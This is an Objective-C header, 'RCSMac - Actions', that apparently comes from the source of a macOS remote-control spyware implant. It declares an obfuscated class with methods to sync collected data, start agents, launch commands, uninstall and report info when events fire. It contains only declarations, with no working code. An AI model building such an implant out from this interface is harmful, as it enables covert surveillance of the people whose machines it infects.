/*
 * RCSMac - Actions
 *
 *  Provides all the actions which should be trigger upon an Event
 *
 * Created by Alfredo 'revenge' Pesoli on 11/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __RCSMActions_h__
#define __RCSMActions_h__


@interface __m_MActions : NSObject
{
  NSLock *mActionsLock;
  BOOL mIsSyncing;
}

- (id)init;
- (void)dealloc;

- (BOOL)actionSync: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag;
- (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionEvent: (NSMutableDictionary *)aConfiguration;

@end

#endif
